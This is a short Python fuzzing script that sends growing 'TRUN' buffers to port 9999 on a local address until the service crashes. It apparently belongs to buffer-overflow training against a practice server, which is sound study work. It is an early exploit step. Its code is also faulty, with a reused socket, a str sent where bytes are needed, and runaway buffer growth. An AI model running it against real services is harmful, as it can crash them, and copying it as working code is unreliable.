"#!/usr/bin/python3" 

import sys, socket as so, struct
from time import sleep

#setting the beginning buffer values and increment steps
buffer = "A"
max_buffer = 10000
increment = 200
counter = 100

s = so.socket(so.AF_INET,so.SOCK_STREAM)

while len(buffer) < max_buffer:
    try:
        s.connect(('192.168.0.1',9999))
        s.send(('TRUN /.:/' + buffer))
        s.close()
        sleep(1)
        buffer = buffer + buffer*increment

    except:
        print("[+] Fuzzing crashed at %s bytes" % str(len(buffer)))
        sys.exit()

print("[!] Buffer limit exceeded, fuzzing failed.")
sys.exit()
        